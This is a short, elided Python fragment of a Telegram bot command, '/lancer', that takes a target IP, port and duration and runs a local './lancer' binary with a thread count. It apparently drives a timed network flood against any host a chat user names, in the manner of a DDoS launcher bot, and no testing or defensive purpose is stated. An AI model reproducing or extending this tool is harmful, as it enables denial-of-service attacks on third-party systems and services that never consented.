...
async def lancer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if len(context.args) != 3:
        await update.message.reply_text("🛡️ Usage: /lancer <target_ip> <port> <duration>")
        return
    ...
    command = ['./lancer', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
    try:
